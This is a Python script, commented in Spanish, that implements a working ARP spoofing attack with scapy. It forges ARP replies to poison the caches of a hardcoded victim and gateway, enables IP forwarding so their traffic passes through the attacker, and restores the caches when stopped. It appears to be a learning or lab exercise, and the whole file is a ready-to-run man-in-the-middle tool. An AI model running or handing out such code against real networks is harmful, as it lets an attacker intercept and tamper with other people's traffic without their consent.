from scapy.all import ARP, Ether, srp, send
import time # Para meter retrasos entre envíos

class ARPSpoofer:
    def __init__(self, target_ip, host_ip, verbose=True):
        self.target_ip = target_ip
        self.host_ip = host_ip
        self.verbose = verbose
        self.hablitar_ip_forwarding() # Para que en caso de no tenerlo habilitado, se habilite.
    
    # Para hacer el ARP Spoofing, hay que modificar el fichero /proc/sys/net/ipv4/ip_forward que
    # por defecto está a 0 (no se reenvían paquetes) y cambiarlo a 1 (se reenvían paquetes).

    def hablitar_ip_forwarding(self): # Habilita el reenvío de paquetes IP
        if self.verbose:
            print("[*] IP forwarding siendo habilitado...")
        ruta_archivo = "/proc/sys/net/ipv4/ip_forward"
        with open(ruta_archivo) as archivo:
            if archivo.read() == '1':
                return
        with open(ruta_archivo, 'w') as archivo:
            print(1, file=archivo)
        if self.verbose:
            print("[*] IP forwarding habilitado.")
    
    # Se comienza con el envenenamiento ARP enviando respuestas ARP falsas al objetivo.
    # 1 - hay que obtener las direcciones IP y MAC legítimas del objetivo y del host.

    @staticmethod # Será un método estático porque no necesita acceder a atributos de la clase.
    def obtener_mac(ip):
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=0) # Enviamos una petición ARP a la IP objetivo.
        # El nombre de la variable lleva una coma y un guion bajo porque srp devuelve dos valores, pero solo nos interesa el primero.

        if ans:
            return ans[0][1].src # Devolvemos la MAC de la respuesta recibida.
    
    # 2 - Método para realizar el envenenamiento ARP.
    def spoofinear(self, ip_objetivo, ip_anfitrion):
        # ip_objetivo: IP del objetivo al que queremos engañar.
        # ip_anfitrion: IP del anfitrión (host) que queremos suplantar.
        mac_objetivo = self.obtener_mac(ip_objetivo)
        
        # Se construye un paquete ARP falso.
        paquete_arp = ARP(op='is-at', pdst=ip_objetivo, hwdst=mac_objetivo, psrc=ip_anfitrion)
        send(paquete_arp, verbose=0) # Enviamos el paquete ARP falso.
        if self.verbose:
            mac_propia = ARP().hwsrc
            print(f"[*] Paquete ARP enviado a {ip_objetivo} ({mac_objetivo}) diciendo que {ip_anfitrion} es {mac_propia}")
    
    # Esta función va a restaurar las direcciones MAC e IP de la caché ARP de la víctima
    def restaurar(self, ip_objetivo, ip_anfitrion):
        mac_objetivo = self.obtener_mac(ip_objetivo)
        mac_anfitrion = self.obtener_mac(ip_anfitrion)
        paquete_arp = ARP(op='is-at', pdst=ip_objetivo, hwdst=mac_objetivo, psrc=ip_anfitrion, hwsrc=mac_anfitrion)
        send(paquete_arp, verbose=0, count=30) # Enviamos el 30 paquetes para asegurar que se reestabelzcan los parámetros originales.
        if self.verbose:
            mac_propia = ARP().hwsrc
            print(f"[!] Configuración restaurada ;P => {ip_objetivo}:{ip_anfitrion} => {mac_anfitrion}")
    


if __name__ == "__main__":
    victima = '192.168.146.139'
    gateway = '192.168.146.2'

    spoofer = ARPSpoofer(victima, gateway) # Creamos el spoofer

    # Comenzamos a enviar esos paquetes ARP falsos
    try:
        while True:
            spoofer.spoofinear(victima, gateway)
            spoofer.spoofinear(gateway, victima)
            time.sleep(1)
    except KeyboardInterrupt:
        print('[!] Deteniendo el ARP Spoofing...')
        print('[!] Restaurando configuración...')
        spoofer.restaurar(victima, gateway)
        spoofer.restaurar(gateway, victima)
